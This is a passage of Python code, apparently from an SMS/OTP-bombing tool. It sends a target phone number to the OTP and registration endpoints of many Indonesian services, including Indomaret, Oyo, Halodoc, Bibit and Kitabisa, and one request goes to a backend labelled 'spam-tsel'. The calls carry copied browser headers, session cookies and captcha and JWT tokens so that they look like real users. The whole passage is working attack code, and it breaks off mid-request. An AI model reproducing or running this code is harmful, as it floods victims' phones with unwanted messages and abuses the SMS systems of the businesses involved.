        Indomaret = requests.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=0"+nomer, headers={"Host": "account-api-v1.klikindomaret.com", "user-agent": user_agent, "content-type": "application/json", "accept": "*/*","origin": "https://account.klikindomaret.com", "referer": "https://account.klikindomaret.com/SMSVerification?nohp=0"+nomer+"&type=register", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
        time.sleep(1.5)
        Carsome_wa = requests.post("https://www.carsome.id/website/login/sendSMS", headers={"Host": "www.carsome.id", "content-length": "38", "x-language": "id", "sec-ch-ua-mobile": "?1", "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36", "content-type": "application/json", "accept": "application/json, text/plain, */*", "country": "ID","x-amplitude-device-id": "A4p3vs1Ixu9wp3wFmCEG9K", "sec-ch-ua-platform": "Android", "origin": "https://www.carsome.id", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://www.carsome.id/", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}, data=json.dumps({"username": "0"+nomer, "optType": 1})).text
        time.sleep(1.5)
        Misteraladin = requests.post("https://m.misteraladin.com/api/members/v2/otp/request", headers={'Host': 'm.misteraladin.com', 'content-length': '82', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'dnt': '1', 'accept-language': 'id', 'sec-ch-ua-mobile': '?1', 'authorization': '', 'x-platform': 'mobile-web', 'content-type': 'application/json', 'accept': 'application/json, text/plain, */*','user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'origin': 'https://m.misteraladin.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://m.misteraladin.com/account', 'accept-encoding': 'gzip, deflate, br'}, data=json.dumps({"phone_number_country_code": "62", "phone_number": nomer, "type": "register"})).text
        time.sleep(1.5)
        Oyo = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=json.dumps({"phone": nomer, "country_code": "+62", "country_iso_code": "ID", "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"}), headers={"Host": "identity-gateway.oyorooms.com", "consumer_host": "https://www.oyorooms.com", "accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", "Content-Type": "application/json", "accept": "*/*", "origin": "https://www.oyorooms.com", "referer": "https://www.oyorooms.com/login", "Accept-Encoding": "gzip,deflate,br"}).text
        time.sleep(1.5)
        DuniaGames = requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/', headers={'Host': 'api.duniagames.co.id', 'content-length': '50', 'accept': 'application/json, text/plain, */*', 'sec-ch-ua-mobile': '?0', 'save-data': 'on', 'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36','content-type': 'application/json', 'origin': 'https://duniagames.co.id', 'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://duniagames.co.id/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}, json={"phoneNumber": ("0"+nomer), "inquiryId": "219424679"}).text
        time.sleep(1.5)
        Pintarnya = requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile", headers={'Host': 'api.pintarnya.com', 'Connection': 'keep-alive', 'Content-Length': '27', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json','Accept': 'application/json, text/plain, */*', 'Cache-Control': 'no-cache', 'Platform': 'web-kerja', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://pintarnya.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://pintarnya.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"mobile": "+62"+nomer})).text
        time.sleep(1.5)
        Kpintar = requests.post("https://h.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id", headers={'Host': 'h.kreditpintar.com', 'Connection': 'keep-alive', 'Content-Length': '47', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'x-adv-market-channel': 'OfficialWebsite', 'x-user-agent': 'Pintar-ID-Cash (WebAndroid;;;id) uuid/23634849-9a8a-48c0-95b7-53ab7359f94a version/0.1.0', 'DNT': '1', 'x-app-version': 'APPVERSION_NAME(9999)', 'Accept-Language': 'id', 'sec-ch-ua-mobile': '?1','User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'x-os-type': 'WEB', 'sentry-trace': '1b9dd6373f7b47e4a21e9003d9d3580d-969ddbf191b89d53-1', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://h.kreditpintar.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://h.kreditpintar.com/OFFICIAL2021/code-step?m=895331973232', 'Accept-Encoding': 'gzip, deflate, br'}, data=json.dumps({"mobileNumber": "+62"+nomer, "type": "SMS"})).text
        time.sleep(1.5)
        Bibit = requests.post("https://api.bibit.id/auth/register/phone", headers={'Host': 'api.bibit.id', 'Connection': 'keep-alive', 'Content-Length': '90', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'X-App-Check': 'eyJraWQiOiJsWUJXVmciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjE4ODMwMjcxNDM5Mzp3ZWI6ODVjZmMxY2M2YWI1OTlkMTExNmM4OCIsImF1ZCI6WyJwcm9qZWN0c1wvMTg4MzAyNzE0MzkzIiwicHJvamVjdHNcL2JpYml0LTRjMThiIl0sImlzcyI6Imh0dHBzOlwvXC9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tXC8xODgzMDI3MTQzOTMiLCJleHAiOjE2NzkzNzM1OTYsImlhdCI6MTY3OTI4NzE5NiwianRpIjoieWh4SnRFWkVScEQ5WWtIenlLS3FtRVFMYzRtTVlxOG0yaTlFS3RkZldMYyJ9.qWHl3BU7jzBtvC_4uDIGi5Ua5MInLfLzjq5JFpF-W3yt6E1x8gunZGosbwkuIdi6HHoHb4opr1LIZO8mfByDHg-T7O7MhKmgGnbfNFZiR9JaTNAulSNqlHKlOjKpLWuCgjePzpIXyLZGXEQW-O1ES-R70hdYWLs-kcSgaKRJBOtLY23PZ8KHp1En8v9AS79WKd0cB0M0tSadKHS_YmTvxRz0nDa-AfU7q_JSQ0ZVWA5-k4aef7v7tJIEl20uowCT5GwVdGEdqIV43a9Qk9ZaQj6mFI6IVc_0C9DPe7Th9AIgWjnimpZAX0KeHFzG3zbdrN180b6KL79-UesN0otceQGfQK_w88lSQGlOESAYugeYOE9jR3nzb_lrVg3vQYPQpvDZGrUBO_Gxds9vNOfBIt6bksUTV1WHQgWHiQElPujpFMEFcLxuhl6KdUUaaszricMA73zJc19m_4UxAVrHa0kepPJKpBBre76W3RH23t4PmT6i-ifBI5kTGbggfZWN','x-platform': 'web', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://app.bibit.id', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://app.bibit.id/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"code": "62", "phone": nomer, "via": "sms", "recaptcha_token": "", "recaptcha_type": "v3"})).text
        time.sleep(1.5)
        Fave = requests.post("https://api.myfave.com/api/fave/v5/auth/request_code", headers={'Host': 'api.myfave.com', 'Connection': 'keep-alive', 'Content-Length': '26', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109" ', 'x-user-agent': 'Fave-PWA/v1.0.0 ', 'DNT': '1 ', 'content-type': 'application/json', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 ','sec-ch-ua-platform': '"Android"', 'Accept': '*/*', 'Origin': 'https://myfave.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://myfave.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"phone": "+62"+nomer})).text
        time.sleep(1.5)
        Mobilku = requests.post("https://api.mobilku.com/user/register", headers={'Host': 'api.mobilku.com', 'Connection': 'keep-alive', 'Content-Length': '44', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'Authorization': 'Bearer', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://www.mobilku.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.mobilku.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"name": "SAYANG", "mobile": "0"+nomer})).text
        time.sleep(1.5)
        Mapclub = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp", headers={'Host': 'beryllium.mapclub.com', 'Connection': 'keep-alive', 'Content-Length': '25', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'Client-Platform': 'WEB', 'DNT': '1', 'Client-Timestamp': '1679687119267', 'Accept-Language': 'en-US', 'sec-ch-ua-mobile': '?1', 'Authorization': 'Bearer','User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://www.mapclub.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.mapclub.com/', 'Accept-Encoding': 'gzip, deflate, br'}, data=json.dumps({"account": nomer})).text
        time.sleep(1.5)
        Sgm = requests.post("https://www.generasimaju.co.id/klub-generasi-maju/resendotp", headers={'Host': 'www.generasimaju.co.id', 'Connection': 'keep-alive', 'Content-Length': '28', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Accept': 'application/json, text/javascript, */*; qUTF-8', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://www.generasimaju.co.id', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.generasimaju.co.id/klub-generasi-maju/otp', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=('msisdn=0'+nomer+'&method=1')).text
        time.sleep(1.5)
        CekAja = requests.post("https://identity.cekaja.com/Account/resendotp", headers={'Host': 'identity.cekaja.com ', 'Connection': 'keep-alive ', 'Content-Length': '21 ', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109" ', 'DNT': '1', 'sec-ch-ua-mobile': '?1 ', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 ', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest ', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://identity.cekaja.com ', 'Sec-Fetch-Site': 'same-origin ', 'Sec-Fetch-Mode': 'cors ', 'Sec-Fetch-Dest': 'empty ', 'Referer': 'https://identity.cekaja.com/Account/SignupViaMobileNumber?isregister=true', 'Accept-Encoding': 'gzip, deflate, br ', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=('username=0'+nomer)).text
        time.sleep(1.5)
        Halodoc = requests.post("https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests", headers={'Host': 'magneto.api.halodoc.com', 'Connection': 'keep-alive', 'Content-Length': '51', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'X-XSRF-TOKEN': 'C6D05698DBE3666D095E31263AF28CA20ACC233D139DEBA66CCD7D92D8EF87BCF7AD40A07F21E9A5B5C759897C071C871912', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://www.halodoc.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6','Cookie': '_gcl_au=1.1.1787438187.1674980226; afUserId=c4a8602c-14d0-40cb-a342-2debfa44f34f-o; AF_SYNC=1679401554035; _gcl_aw=GCL.1679486369.CjwKCAjwzuqgBhAcEiwAdj5dRtbmRSicfkuKumD6Na6rXuCpf8gB7jiBGylrC9Y-ercLJ4yd-R8A_hoC97oQAvD_BwE; _gac_UA-89605346-3=1.1679486417.CjwKCAjwzuqgBhAcEiwAdj5dRtbmRSicfkuKumD6Na6rXuCpf8gB7jiBGylrC9Y-ercLJ4yd-R8A_hoC97oQAvD_BwE; _gid=GA1.2.101748674.1679859776; XSRF-TOKEN=C6D05698DBE3666D095E31263AF28CA20ACC233D139DEBA66CCD7D92D8EF87BCF7AD40A07F21E9A5B5C759897C071C871912; _gat_UA-89605346-3=1; _ga=GA1.1.2138772867.1674980227; _ga_H80RW7D90X=GS1.1.1679962981.10.0.1679962981.0.0.0; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f941e309-c9fe-4dc5-58a2-92d0e82030f2%22%2C%22c%22%3A1674980226508%2C%22l%22%3A1679962981806%7D; amp_394863=NOoD2H5O_8rskt6hDrv7sO...1gsiphh9i.1gsipho17.1j.a.1t; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22bdcf68d1-2d7c-d603-e677-66ed0097cd97%22%2C%22e%22%3A1679964788593%2C%22c%22%3A1679962981801%2C%22l%22%3A1679962988593%7D'}, data=json.dumps({"phone_number": "+62"+nomer, "channel": "sms"})).text
        time.sleep(1.5)
        Kitabisa = requests.post("https://wong.kitabisa.com/register/draft", headers={"Host": "wong.kitabisa.com", "x-ktbs-platform-name": "pwa", "origin": "https://account.kitabisa.com", "x-ktbs-time": "1611020248", "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "x-ktbs-api-version": "1.0.0", "accept": "application/json","x-ktbs-client-name": "kanvas", "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13", "x-ktbs-client-version": "1.0.0", "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e", "version": "3.4.0", "referer": "https://account.kitabisa.com/register/otp?type=sms", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}, data=json.dumps({"full_name": "joshuwa321", "username": "62"+nomer, "otp_type": "whatsapp"})).text
        time.sleep(1.5)
        duniagames = requests.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp", headers={'Host': 'api.duniagames.co.id', 'Connection': 'keep-alive', 'Content-Length': '58', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'Accept-Language': 'id', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','Content-Type': 'application/json', 'Ciam-Type': 'FR', 'Accept': 'application/json, text/plain, */*', 'x-device': '0a07b11f-e23d-45cf-8a5e-dbaaad4bfadb', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://duniagames.co.id', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://duniagames.co.id/', 'Accept-Encoding': 'gzip, deflate, br'}, data=json.dumps({"phoneNumber": "+62"+nomer, "userName": "0"+nomer})).text
        time.sleep(1.5)
        Momobil_id = requests.post("https://api.momobil.id/users/otp/send", headers={'Host': 'api.momobil.id', 'Connection': 'keep-alive', 'Content-Length': '40', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'sec-ch-ua-platform': '"Android"', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','Content-Type': 'application/json', 'Accept': '*/*', 'Origin': 'https://momobil.id', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://momobil.id/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"to": "0"+nomer, "type": "register"})).text
        time.sleep(1.5)
        Qoala = requests.post("https://api.qoalaplus.com/go-agent/v2/otp/+62"+nomer, headers={'Host': 'api.qoalaplus.com', 'Connection': 'keep-alive', 'Content-Length': '16', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'X-CAPTCHA-TOKEN': '03AKH6MREzUzQuomuk-Q2qMlaBx5xi3rsvarKyTIV_x8YPqoQM7Vq9NecuNaoFeGJheIY_WXz8578LTAGzqtmmFc3CT5fd8e6nuW7Ya7Wbq0pmBcJBn2qMaY61ifDcwjjH-uSNLt0-C55AAzO5v1oncEJ9QLHX6Li7OHY78vaDisgLW7PK2jXCyXX8cMUHId7bSGEdrdNApQQX2THuhMHKFVyEgftf0KviV-wntTsGIkvf3szthaAHyH_ZdZCby_I2mkMFd32eaPu8YDB6K15eTop6nuo7kTcoWi70Szl-hpy3uFZX1QP_GSmtuHwZMU2jCVlC_oE5r4UKXr55YwcZaZHGDI7TrpDFogOxWMqs8JZMNiwJhA5Y5ICYpiTFqsWerTYSUljJl-FlbeN5fFpPS8oVdeIgdkR8YNogk5KTvH4IORgqbj2QKhCoiUlSY_PKMlX_2Ivjoi-eNQ5g4RSPxbn9uM1NogAyrEmJNsbyvLMcvHRFxvS-5e5fWIg6oRVwZErn3HytrkdNYrvZ3FIgt-5tM5gSH_FNew46u8AVVA4PtdBDfKyLH5k4-bbH-GrL0JCB4Nb2XRxo6lnDwN6ZnLadph-6ywNUe_jWn-C6VZcZMCoOh5Yrn-FEaE58h2AXj9ceJfrLexb2LVruopu8il1gp-kpdPAR_s7SxkLyTJZrbdKkoIC0SSvzsWUdWDflLIhNTA-iX1A3psAnx2-8h2dxKYqZQprXMmwjOaCvZloPg_Ib8ARqXcvIkk3JTqOE4VShXbG3fIabiP_svhs7MFzjiQ5QY7eq6ELHYilJXB3R5RcZbIDz95EE2JDkwZTavITATn6rUAy6FT2vLA9cZjhQoNWKNSCdPYvN4nRc4CWag412H7cFx4H_cy3W5fThdZYgnb7AuJ2Qvx_IC8NgWtD8cu9diR8Jnqk7PQ8Jyq6iy5KxKksTYMq7e7G1VKLdOeJ47Q_Ww0eVD7uhh3G_Y5NSQ9PF6y3Tz3_d4HIGIr5AeD-378K5Xc1INcdGwdZh66qNvkk3i1C88VuSVxAHzP5VXx8J7DI11wUshdWyy5yN3W3Hq43BnQRi7K-u1hi2mUBi2jMRWqpqClKXZ173Uf28MKdXxmeug_sPfaCE3R3-Au9fDEi2rvVhVu1alKnjTj3wiQ1BlZEUwISEsrm5EDKVOvaaMAd_KO6KJDR4gngq-gd8dHvKB2vnHU9GNAw244Cb6Yp6tJqua8fK5EuESipJQ8MY7k8cAidQ982m3cDphd06Nc4dO2UTN75JD_5AcrxhL5HuKx39B6QT8g9EYXjVsCwZiKcLy6erPLUILpjb6ZABkssDcIM80C872OmbgwW2qifdVL1oyUjXvgkjgaufLRUfT1mSAJtsJJ19rKqz026zgMGYE9KVItGFp1SFLdB_pZZ3Da2BGmyGWEPQjVbK64cxZx3Tcw_nz7LcBFYXMgQ_V4ymCRHz3XKuxqzGhKgmN4Zq0jE_lR_cgwkxEzps20p4NtK8rdbZcMr8e-DXYFcdzCNbXS-CCG65ruyz6kFPmGs_Cz1VXA7c-gUhNpFR8WRyHimdIMA0Gr97oIpBKsOZ_fidQu4','DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://www.qoalaplus.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.qoalaplus.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"channel": "SMS"})).text
        time.sleep(1.5)
        NextCool = requests.post("https://nextcool.id/wp-json/ecommer/v1/captcha", headers={'Host': 'nextcool.id', 'ecommer-sign': '0ea708bbefbfc3f7ea8d17a7ece21d5f', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','productCode': 'UKU', 'timestamp': '1680862994', 'fireBaseToken': 'null', 'Origin': 'https://nextcool.id', 'Referer': 'https://nextcool.id/app/login?action=toHref&from=home&node=2&href=%2Fmy-account'}, data=json.dumps({"username": "0"+nomer, "type": "VOICE_SMS", "node": "2"})).text
        time.sleep(1.5)
        data_rupiahcepat = json.dumps({"mobile": "0"+nomer, "noise": "1583590641573155574","request_time": "158359064157312", "access_token": "11111"})
        Rupiah_Cepat = requests.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code", headers={"accept": "text/html, application/xhtml+xml, application/json, */*", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-length": "166", "content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://h5.rupiahcepatweb.com", "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site", "user-agent": user_agent}, data={"data": data_rupiahcepat}).text
        time.sleep(1.5)
        Mokapos = requests.post("https://service.mokapos.com/account/v1/verification/phone/send", headers={"accept": "application/json, text/plain, */*", "authorization": "undefined", "save-data": "on", "user-agent": user_agent, "content-type": "application/json;charset=UTF-8"}, json={"phone_number": f"+62{nomer}"}).text
        time.sleep(1.5)
        Oto_com = requests.post("https://www.oto.com/ovb/send-otp?lang=id", headers={'Host': 'www.oto.com', 'content-length': '49', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'dnt': '1', 'sec-ch-ua-mobile': '?1', 'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 ', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8 ','accept': 'application/json, text/javascript, */*; q=0.01 ', 'x-requested-with': 'XMLHttpRequest', 'sec-ch-ua-platform': '"Android" ', 'origin': 'https://www.oto.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors ', 'sec-fetch-dest': 'empty', 'referer': 'https://www.oto.com/ovb/user-login ', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data='mobile='+nomer+'&bookingId=0&businessUnit=mobil').text
        time.sleep(1.5)
        FreeBox = requests.post("https://api.freeboxglobal.com/freeboxMember/app/captcha/getCaptcha", headers={'accept': 'application/json, text/plain, */*', 'lang': 'id', 'Content-Type': 'application/json','Content-Length': '23', 'Host': 'api.freeboxglobal.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.2'}, data=json.dumps({"phone": nomer})).text
        time.sleep(1.5)
        mytsel = requests.post("https://tools.tutorialinjectid.my.id/spam-tsel/backend.php", headers={'Host': 'tools.tutorialinjectid.my.id', 'Connection': 'keep-alive', 'Content-Length': '22', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
                               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://tools.tutorialinjectid.my.id', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://tools.tutorialinjectid.my.id/spam-tsel/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data='url=0'+nomer+'&jml=1').text
        time.sleep(1.5)
        Iuiga = requests.post("https://m.iuiga.id/v1/smscheck/register-send", headers={'Host': 'm.iuiga.id', 'Connection': 'keep-alive', 'Content-Length': '56', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'iuiga-webpc': 'IUIGAPCTRUE', 'DNT': '1', 'language': 'id_id', 'jwt': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhcGkuaXVpZ2EuaWQiLCJpYXQiOjE2ODA2MzUxMjUsImV4cCI6MTY4MTIzOTkyNSwicGxhdGZvcm0iOjUsInVzZXJJZCI6LTk5fQ.wT2Barh2KC6bhca2fLh5JkuY47NTZlTgfdwuGcnlLwc', 'sec-ch-ua-mobile': '?1', 'Authorization': 'Bearer 926447d15c1bd88e1c48825647bfb7041ef0f5de', 'Access-Control-Max-Age': '0', 'Content-Type': 'application/x-www-form-urlencoded',
